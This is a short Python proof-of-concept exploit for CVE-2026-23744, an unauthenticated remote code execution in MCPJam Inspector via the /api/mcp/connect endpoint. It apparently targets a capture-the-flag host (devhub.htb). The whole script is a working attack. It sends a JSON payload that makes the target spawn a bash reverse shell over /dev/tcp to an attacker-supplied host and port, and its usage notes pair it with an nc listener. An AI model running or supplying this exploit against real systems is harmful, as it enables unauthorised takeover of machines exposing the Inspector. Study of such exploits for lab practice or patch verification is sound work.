#!/usr/bin/env python3
"""CVE-2026-23744 — MCPJam Inspector unauth RCE via POST /api/mcp/connect.

Affected: MCPJam Inspector <= 1.4.2 (fix 1.4.3). Default bind 0.0.0.0.
The connect endpoint takes attacker-controlled command/args and spawns them.

Usage:
  nc -lvnp 4444
  python3 cve_2026_23744.py --url http://devhub.htb:6274 --lhost 10.10.x.x --lport 4444
"""
from __future__ import annotations

import argparse
import json
import urllib.error
import urllib.request


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="Inspector base, e.g. http://devhub.htb:6274")
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", type=int, default=4444)
    ap.add_argument("--server-id", default="x")
    args = ap.parse_args()

    payload = {
        "serverConfig": {
            "command": "bash",
            "args": ["-c", f"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1"],
            "env": {},
        },
        "serverId": args.server_id,
    }
    url = args.url.rstrip("/") + "/api/mcp/connect"
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode(errors="replace")
            print(f"[{resp.status}] {body[:500]}")
    except urllib.error.HTTPError as e:
        print(f"[http {e.code}] {e.read()[:500]!r}")
    except urllib.error.URLError as e:
        print(f"[err] {e}")


if __name__ == "__main__":
    main()
